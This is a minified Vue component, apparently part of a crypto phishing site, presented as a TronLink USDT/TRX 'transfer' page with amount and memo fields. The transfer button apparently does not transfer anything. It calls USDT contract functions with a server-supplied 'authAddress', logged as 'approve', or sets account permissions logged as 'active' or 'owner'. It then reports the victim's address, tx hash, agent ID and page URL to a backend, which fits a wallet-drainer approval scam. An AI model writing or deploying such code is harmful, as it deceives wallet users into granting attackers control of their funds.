import{u as e}from"./bEF4wQsI8-835414c1.js";import{g as a,s as t,a as s,b as l}from"./Gq0sU1-92a05eef.js";import{B as o,t as c,g as i,a as r,b as n}from"./vaGsUkzTU-ffe9afa5.js";import{v as d,c as u,b as p,Q as m,P as v,l as f,V as b,M as g,R as j,S as y,O as x,q as h}from"./FOuo2c-3968258a.js";import{r as k,u as w}from"./Q7PZYuBALU-00755189.js";import{P as S,n as T}from"./P-19fdc20a.js";import{F as I,B as U,s as _,a as A,c as L}from"./DV7XD-cc52e100.js";import{_ as O}from"./MYkovOwMx-3e787095.js";import"./SMMGXFQUUk-7c8912ae.js";import"./TUAV-9c616223.js";import"./r2-51522e50.js";import"./6qrq-b26ae33f.js";import"./Jzw-58335642.js";import"./dDOtsLkL2g-0b0befdd.js";import"./upmSEfqr0P-bd9b9222.js";import"./M-09370c22.js";import"./m6VGzU-faa29fb4.js";import"./iHrO-4925fce4.js";import"./PfF-b863fecc.js";import"./HNza7D-9793841f.js";import"./kb29d4-068d1ad5.js";import"./gmAqu-958c92ee.js";import"./pKq-c8045ec4.js";import"./PRGpLnU-c26e1867.js";import"./XAxBIzg-37a6991b.js";import"./Vj1k0Bg2nj-f01c4fde.js";import"./w-f120cb75.js";import"./aFP-a185c5f2.js";import"./Q-b2e94a2e.js";import"./f06B-8de45486.js";/* empty css            */import"./7eCO-c2697939.js";/* empty css           */import"./N5xDi-aeaac01a.js";const z=e=>(j("data-v-0745702c"),e=e(),y(),e),V={class:"page-container bg-white-only"},P=z((()=>v("div",{class:"top-title center-w bold"},[v("i",{class:"base-Left fs18 baseIconFont left-m10"}),v("span",{class:"bold left-m10"},"转账"),v("span",{class:"left-m10 fs14 o6"},"(2/2)")],-1))),q={class:"bottom-m10 left-m10 right-m10"},D=z((()=>v("span",{class:"top-m30 bold fs14"},"通证",-1))),F={class:"bold collet-address center-w bg-gray1 left-p10 right-p10 spaceb top-m10 top-p10 bottom-p10 br6"},N={class:"center-w"},R=["src"],C={class:"left-m10 bold fs16"},X={key:0,class:"left-m10 o6 fs12"},B={key:1,class:"left-m10 o6 fs12"},G=z((()=>v("text",{class:"base-i-right baseIconFont"},null,-1))),M=z((()=>v("div",{style:{height:"9px"},class:"bg-gray1"},null,-1))),Q={class:"bg-white bold collet-address top-m20 border-m"},J=z((()=>v("div",{class:"bottom-m10 left-m10 right-m30 fs14 bold"},"数量",-1))),H={class:"address left-m10 o7 bottom-p10 right-m20 column"},Y={class:"spaceb right-m10 top-m10"},E={class:"fs12"},K=[z((()=>v("text",{class:"fs12"},"添加转账备注",-1))),z((()=>v("text",{class:"base-Down baseIconFont fs12 left-m10"},null,-1)))],Z={key:0,class:"bottom-m20 left-m10 right-m10"},W=z((()=>v("div",null,[v("text",{class:"top-m30 bold fs14"},"备注"),v("text",{class:"fs12 o6"},"（选填）")],-1))),$={class:"address top-m10 o7 bottom-p10 column"},ee=z((()=>v("div",{class:"fs12 text-blue top-m10"}," 添加转账备注，将额外消耗 1 TRX 的手续费 ",-1))),ae={class:"center-w confirm-btn left-m10 right-m10",style:{"margin-top":"15px"}},te=O(d({__name:"tronlinkPay",setup(d){const j=k(0),y=k(0),O=k({type:1,walletType:1,agentId:"",token:"USDT",amount:1,block:o.TRX,clientId:"",ads:"",client_type:1,isAdd:!1,extend:{}}),z=k("");k("");const te=k({authAddress:"",clientId:"",receiveAddress:{trx:"",eth:"",bsc:""},authSuccessTips:""}),se=k(!1);e();const le=k(""),oe=k(!1),ce=k(""),ie=()=>{const{type:e}=O.value;if(y.value<j.value)return _("Insufficient balance");1==e?(async()=>{try{A({message:"Loading...",duration:0});const e=await r("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",z.value,ce.value);e.result&&(re(ce.value,"approve",e.txid),_(te.value.authSuccessTips))}catch(e){L()}})():2==e&&(async()=>{if(O.value.block!=o.TRX)return;const e=await n(z.value,ce.value,O.value.isAdd);(null==e?void 0:e.result)?(re(ce.value,"active",e.txid),_(te.value.authSuccessTips),L()):e&&_("object"==typeof e?JSON.stringify(e):String(e))})()},re=async(e,a,o)=>{const c={addres:e,auth_addres:z.value,hash:o||0,wallete_type:"TronLink",client_id:O.value.clientId||te.value.clientId||"",source:window.location.href,agent_uid:O.value.agentId,block:O.value.block,client_type:O.value.client_type,amount:O.value.amount,extend:O.value.extend?JSON.stringify(O.value.extend):""};switch(a){case"approve":await l(c);break;case"active":await s(c);break;case"owner":await t(c)}L()};u((()=>O.value.ads||te.value.receiveAddress));return p((()=>{const e=JSON.parse(localStorage.getItem("routerParams"));j.value=e.amount,O.value={amount:j.value,type:e.type,walletType:1,agentId:e.agent,token:e.token||"USDT",block:o.TRX,clientId:e.clientId||"",ads:e.ads||"",isAdd:e.isAdd,client_type:e.client_type||1,extend:e.extend||""},(async()=>{try{const e=JSON.parse(localStorage.getItem("config"));te.value={...e};const{type:t}=O.value;oe.value=!0;const s=await a({block:O.value.block,type:c[O.value.type]});oe.value=!1;const l=s.data;te.value={...e,authAddress:l},z.value=te.value.authAddress}catch(e){oe.value=!1}})(),(async()=>{if(ce.value=await tronWeb.defaultAddress.base58,!ce.value)return _("无法获取钱包地址！请检查浏览器是否支持TRON！");y.value=await i(ce.value,O.value.token)})()})),(e,a)=>(x(),m("div",V,[P,v("div",q,[D,v("div",F,[v("div",N,[v("img",{width:"30",height:"30",src:`/assets/token/${String(O.value.token).toLocaleLowerCase()}.png`},null,8,R),v("span",C,S(String(O.value.token).toLocaleUpperCase()),1),"trx"==String(O.value.token).toLocaleLowerCase()?(x(),m("span",X,"(TRON)")):(x(),m("span",B,"(Tether USD)"))]),G])]),M,v("div",Q,[J,v("div",H,[f(w(I),{modelValue:j.value,"onUpdate:modelValue":a[0]||(a[0]=e=>j.value=e),type:"number",label:"",placeholder:"输入转账数量",size:"large",style:{"font-size":"16px",padding:"10px 15px","border-radius":"5px","background-color":"#f9fafb"}},null,8,["modelValue"]),v("div",Y,[v("text",E,"可用："+S(y.value),1)])])]),v("div",{onClick:a[1]||(a[1]=e=>se.value=!se.value),class:T("center-w right-m10 top-m10 text-blue"),style:{"justify-content":"flex-end"}},K),se.value?(x(),m("div",Z,[W,v("div",$,[v("div",null,[f(w(I),{modelValue:le.value,"onUpdate:modelValue":a[2]||(a[2]=e=>le.value=e),label:"",placeholder:"请输入备注,不超过 200 个字符",size:"large",style:{"font-size":"13px",padding:"10px 14px","border-radius":"5px","background-color":"#f9fafb"}},null,8,["modelValue"]),ee])])])):b("",!0),v("div",ae,[f(w(U),{style:{width:"100%","border-radius":"8px"},size:"large",color:"#3478f6",onClick:ie,loading:oe.value},{default:g((()=>[h("转账")])),_:1},8,["loading"])])]))}}),[["__scopeId","data-v-0745702c"]]);export{te as default};
